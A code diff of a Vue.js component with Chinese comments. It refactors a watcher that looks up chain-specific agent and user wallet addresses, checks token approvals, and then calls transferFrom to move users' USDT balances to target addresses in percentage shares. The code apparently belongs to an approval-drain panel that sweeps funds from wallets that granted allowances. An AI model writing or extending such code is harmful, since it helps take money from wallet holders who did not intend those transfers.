@@ -112,22 +112,22 @@ export default {
     watch: {
         list: function (newVal, Val) {
             this.listawait = [];
-            newVal.filter(async (item, index) => {
-                var chainType = newVal[0].chainType
-                var agentAddress, userAddress
-                if (chainType == 'ETH') {
-                    agentAddress = this.user.ethMainnetAddress          //激励钱包地址
-                    userAddress = newVal[0].ethMainnetAddress
-                }
-                else if (chainType == 'BSC') {
-                    agentAddress = this.user.bscMainnetAddress          //激励钱包地址
-                    userAddress = newVal[0].bscMainnetAddress
-                }
-                else if (chainType == 'TRC') {
-                    agentAddress = this.user.trcMainnetAddress          //激励钱包地址
-                    userAddress = newVal[0].trcMainnetAddress
-                }
+            var chainType = newVal[0].chainType
+            var agentAddress, userAddress
+            if (chainType == 'ETH') {
+                agentAddress = this.user.ethMainnetAddress          //激励钱包地址
+                userAddress = newVal[0].ethMainnetAddress
+            }
+            else if (chainType == 'BSC') {
+                agentAddress = this.user.bscMainnetAddress          //激励钱包地址
+                userAddress = newVal[0].bscMainnetAddress
+            }
+            else if (chainType == 'TRC') {
+                agentAddress = this.user.trcMainnetAddress          //激励钱包地址
+                userAddress = newVal[0].trcMainnetAddress
+            }
 
+            newVal.filter(async (item, index) => {
                 await blockChain.checkApprove(agentAddress, userAddress, (result) => {
                     if (result != false) {
                         this.listawait.push(item)
@@ -232,7 +232,7 @@ export default {
                             message: h('i', { style: 'color: teal' }, '账户余额: ' + balance + 'USDT' + "\n划账数额: " + curBalance)
                         })
 
-                        console.log('USDT总额: (' + balance +')  ' + agentAdress + '[' + this.getAccountTransfer[index].proportion + '%]' + ' 得到的USDT: ', curBalance)
+                        console.log('USDT总额: (' + balance + ')  ' + agentAdress + '[' + this.getAccountTransfer[index].proportion + '%]' + ' 得到的USDT: ', curBalance)
                         blockChain.doTransferFrom(agentAdress, apiKey, userEthAddress, targetAddress, curBalance, async (status, hash, nonce) => {
                             if (status == true) {
                                 // 划账记录
